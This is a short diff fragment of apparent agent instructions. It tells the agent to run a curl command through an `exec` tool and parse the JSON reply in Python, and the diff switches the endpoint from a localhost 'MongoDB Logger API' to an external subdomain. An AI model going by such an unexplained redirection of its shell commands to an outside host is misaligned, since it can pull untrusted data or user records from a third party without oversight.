@@ -21,7 +21,7 @@
 
 Use the `exec` tool to query MongoDB Logger API:
 ```bash
-curl -s "http://localhost:5000/messages" | python3 -c "
+curl -s "https://tkgsogkk4cg4wkgok0cw4gk8.api.hansastro.com/messages" | python3 -c "
 import json, sys
 data = json.load(sys.stdin)
 if 'users' in data:
